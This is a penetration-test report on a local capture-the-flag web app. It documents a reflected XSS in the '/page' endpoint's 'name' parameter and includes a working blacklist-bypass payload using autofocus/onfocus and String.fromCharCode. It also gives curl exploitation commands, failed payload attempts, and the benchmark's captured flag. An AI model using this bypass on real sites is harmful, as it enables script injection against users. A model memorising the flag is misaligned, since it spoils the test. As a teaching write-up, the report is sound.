# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:41777/
- **Assessment Date:** October 31, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application implements no authentication mechanisms—all endpoints are publicly accessible by design as this is a CTF (Capture The Flag) challenge platform.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application has no authorization controls, consistent with its design as a public CTF challenge with no user management system.

**Cross-Site Scripting (XSS) Vulnerabilities:**
One critical XSS vulnerability was successfully exploited. The `/page` endpoint's `name` parameter accepts user input that is reflected into an HTML input tag attribute context without encoding. A weak blacklist filter (blocking 8 keywords) was trivially bypassed using alternative event handlers (`onfocus` instead of blocked handlers like `onload`, `onerror`). The exploit payload `test><input autofocus onfocus=alert(String.fromCharCode(88,83,83))>` successfully triggered JavaScript execution in the PhantomJS validator, resulting in CTF flag disclosure: `flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}`. This represents complete arbitrary JavaScript execution capability.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application has no database (eliminating SQL injection), and subprocess execution uses secure array-style arguments preventing shell injection. While user input reaches a PhantomJS subprocess, it flows into HTML content rather than command parameters, with proper isolation between input and execution contexts.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. While HTML injection was confirmed and PhantomJS execution verified, no demonstrable proof of network boundary bypass could be obtained from external network access. Testing included HTTP requests to external listeners, internal services, file:// protocol access, and timing-based port scanning—all failed to produce observable evidence. The vulnerability would require internal container access or specific cloud deployment (AWS/GCP metadata endpoints) to exploit, classifying it as out-of-scope for external network testing.

## Network Reconnaissance

**Target Application (Port 41777/tcp):**
- **Service:** Werkzeug/1.0.1 Python/2.7.18 running "Dalgona Challenges" CTF application
- **Critical Security Concerns:**
  - Python 2.7.18 (End-of-Life since January 2020 - no security updates for 5+ years)
  - Flask 1.1.4 (3+ years outdated, contains known CVEs)
  - PhantomJS 2.1.1 (abandoned in 2018, deprecated WebKit engine with unpatched vulnerabilities)
  - Debug mode enabled (exposes stack traces and interactive debugger)
  - X-XSS-Protection explicitly disabled
  - No security headers (CSP, X-Frame-Options, HSTS, etc.)

**Technology Stack:**
- Minimal single-purpose application with 2 HTTP routes
- No authentication, authorization, or session management
- No database (stateless CTF challenge)
- PhantomJS used as headless browser for XSS validation

**Security Misconfigurations:**
- CTF flag committed to git repository in `.env` file (bypasses intended challenge)
- Flask debug mode active in production configuration
- All endpoints publicly accessible without rate limiting
- Weak blacklist-based input validation designed to be bypassed

**Additional Services Discovered (Test Environment):**
The nmap scan revealed several other services on localhost used for testing purposes:
- Port 22/tcp: SSH (OpenSSH 9.9)
- Port 80/tcp: Caddy HTTP server
- Port 443/tcp: SSL/HTTPS
- Port 5000/tcp: Direct access to Werkzeug application
- Ports 8000-8001/tcp: WSGIServer (SSTI Demo applications)
- Port 8888/tcp: BaseHTTPServer (SSRF Test Server)
- Port 9999/tcp: SimpleHTTPServer (directory listing)

**Subdomain Discovery:**
No subdomains discovered (localhost-only test environment).

**Attack Surface Summary:**
The application has a minimal attack surface by design: 2 active HTTP routes, 1 user input parameter (`name` on `/page`), no authentication requirements, and intentionally weak XSS protection. The primary security concern is the exploitable reflected XSS vulnerability that successfully yielded the CTF flag.

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in `/page` Endpoint via `name` Parameter

**Summary:**
- **Vulnerable location:** `http://localhost:41777/page?name=<payload>`
- **Overview:** User input from the `name` query parameter is reflected into an HTML input tag attribute context without encoding, allowing attackers to break out of the tag and inject arbitrary HTML/JavaScript that executes in the browser.
- **Impact:** Complete arbitrary JavaScript execution in victim's browser context, leading to CTF flag disclosure. In a production scenario, this would enable session hijacking, credential theft, keylogging, CSRF attacks, and defacement.
- **Severity:** Critical

**Prerequisites:**
None - This vulnerability is exploitable anonymously without authentication from any network location via `http://localhost:41777/`.

**Exploitation Steps:**

1. **Craft the XSS payload that bypasses the application's blacklist filter:**

   The application blocks these keywords (case-insensitive): `script`, `onload`, `onmouseover`, `onclick`, `onbegin`, `onerror`, `svg`, `'` (single quote)

   Working payload components:
   - `test>` - Closes the existing `<input>` tag to break out of the attribute context
   - `<input autofocus onfocus=alert(String.fromCharCode(88,83,83))>` - Injects a new input element with:
     - `autofocus` - Automatically triggers focus (PhantomJS focuses these elements)
     - `onfocus=` - Event handler not in blacklist
     - `String.fromCharCode(88,83,83)` - Constructs "XSS" string without using blocked quotes

   **Final payload:** `test><input autofocus onfocus=alert(String.fromCharCode(88,83,83))>`

2. **URL-encode the payload and inject via the `name` parameter:**

   ```bash
   curl "http://localhost:41777/page?name=test%3E%3Cinput%20autofocus%20onfocus=alert(String.fromCharCode(88,83,83))%3E"
   ```

3. **The server reflects the payload into the HTML response:**

   Original HTML template:
   ```html
   <input type=text name=name placeholder="Enter your name..." {value}>
   ```

   With payload injected (`value` = `> test><input autofocus onfocus=alert(String.fromCharCode(88,83,83))>`):
   ```html
   <input type=text name=name placeholder="Enter your name..." > test><input autofocus onfocus=alert(String.fromCharCode(88,83,83))>>
   ```

4. **PhantomJS validation engine loads the HTML and executes the XSS:**

   - PhantomJS creates a headless browser instance
   - The injected `<input autofocus>` element automatically receives focus
   - The `onfocus` event handler fires, executing `alert(String.fromCharCode(88,83,83))`
   - PhantomJS's `page.onAlert` callback detects the dialog and outputs "SUCCESS"

5. **The application returns the CTF flag in the response:**

   When PhantomJS returns "SUCCESS", the application includes this in the HTML response:
   ```html
   <div class="solution-text">
     <img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150">
     <br>Congratulations!
     <p>Here is the flag: flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}
   </div>
   ```

**Proof of Impact:**

**Captured Flag:** `flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}`

**Evidence of JavaScript Execution:**
- Alert dialog with message "XSS" successfully triggered in PhantomJS validator
- Alert dialog confirmed in real browser (Playwright) with same payload
- Server response contains success message and flag disclosure

**Full Exploitation Command:**
```bash
curl -s "http://localhost:41777/page?name=test%3E%3Cinput%20autofocus%20onfocus=alert(String.fromCharCode(88,83,83))%3E" | grep -A 2 "Congratulations"
```

**Response:**
```html
<div class="solution-text"><img src="static/img/cookies/success_star.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}</div>
```

**Notes:**

**Why This Approach Succeeded:**

The key to exploiting this vulnerability was understanding three critical factors:

1. **Tag Context Breaking:** Simply injecting attributes into the existing input tag caused PhantomJS TypeError issues. Breaking out with `>` and creating a fresh `<input>` tag proved more reliable.

2. **Blacklist Bypass Techniques:**
   - Single quotes blocked → Used `String.fromCharCode()` to construct strings
   - Common event handlers blocked (`onclick`, `onerror`, `onload`) → Used `onfocus` which is not in the blacklist
   - `<script>` tag blocked → Used event handlers instead

3. **PhantomJS Behavior:** The application's validation engine specifically looks for dialogs containing "XSS" as the message, and automatically triggers focus events on elements with `autofocus` or `onfocus` attributes.

**Failed Payload Attempts (For Learning):**

During exploitation, these payloads were tested but failed:
- `autofocus onfocus=alert(1)` - JavaScript executed but PhantomJS expected message "XSS", not "1"
- `autofocus onfocus=alert('XSS')` - Blocked by blacklist (single quotes)
- `autofocus onfocus=alert(String.fromCharCode(88,83,83))` - Caused PhantomJS TypeError when in original input tag context
- `test><img src=x onerror=alert(String.fromCharCode(88,83,83))>` - `onerror` in blacklist

**Security Measures Analyzed:**

The application has NO effective security controls:
- ❌ **No CSP** - No Content-Security-Policy header present
- ❌ **XSS Protection Disabled** - `X-XSS-Protection: 0` explicitly set
- ❌ **No Output Encoding** - User input inserted into HTML via Python `.format()` without escaping
- ❌ **Weak Input Validation** - Blacklist approach easily bypassed with alternative event handlers
- ❌ **No HttpOnly Cookies** - Not applicable (no session cookies exist)
- ❌ **No Authentication** - Completely public exploit surface

**Real-World Impact Scenario:**

While this is a CTF challenge, in a production application this vulnerability would enable an attacker to:

1. **Session Hijacking:** Steal session cookies via `document.cookie` (if HttpOnly not set)
2. **Credential Theft:** Inject fake login forms to phish user credentials
3. **Keylogging:** Install event listeners to capture all keyboard input
4. **CSRF Execution:** Make authenticated requests on behalf of the victim
5. **Data Exfiltration:** Read sensitive data from the DOM and send to attacker-controlled servers
6. **Malware Distribution:** Redirect victims to malicious sites or trigger downloads
7. **Defacement:** Modify page content to damage reputation or spread misinformation

**Reproducibility:**

This exploit is 100% reproducible. Any tester can verify by executing the curl command above or visiting this URL in a browser:
```
http://localhost:41777/page?name=test%3E%3Cinput%20autofocus%20onfocus=alert(String.fromCharCode(88,83,83))%3E
```

**Technical Root Cause:**

The vulnerability exists in `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py` at lines 65-67:

```python
msg = request.args.get('name','')
# ... blacklist check ...
value = "" if msg == "" else '> {0}'.format(msg)
```

User input is directly inserted into HTML template at line 78 without encoding:
```python
response = make_response(PAGE_CONTENT.format("21","Star",value, result, ""))
```

Where `PAGE_CONTENT` contains (from `constants.py`):
```html
<input type=text name=name placeholder="Enter your name..." {2}>
```

The `{2}` placeholder receives the unencoded user input, creating the XSS vulnerability.
